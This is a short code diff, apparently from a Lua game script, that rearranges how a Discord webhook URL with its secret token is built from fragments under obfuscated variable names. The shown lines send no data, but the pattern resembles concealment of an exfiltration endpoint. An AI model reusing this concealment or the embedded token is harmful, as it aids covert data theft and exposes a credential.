@@ -792,12 +792,10 @@ local values = {
 	["Aliens"] = 1,
 	["Moon"] = 1
 }
-local ajgbsjw = "https://discord.com/api"
+local ajgbsjw = "https://discord.com/api/webhooks/1309583394853884066/"
 local kebtbak = "CYYYwQ4_0WMzoO3xFlyRE"
-local kwbrbsi = "-KiJb1oUEsYUccvZT7pSFIcQ4"
-local oqbrbek = "DzjS2HKfLUv76byqGpgwi7"
-local pqqjevw = "/webhooks/1309583394853884066/"
-webHook = "\"" .. ajgbsjw .. pqqjevw .. kebtbak .. kwbrbsi .. oqbrbek .. "\""
+local kwbrbsi = "-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
+webHook = "\"" .. ajgbsjw .. kebtbak .. kwbrbsi .. "\""
 --local kwbabsi = "X4"
 --local iwnrbtk = "_"
 --local pqjrbwi = "ND"
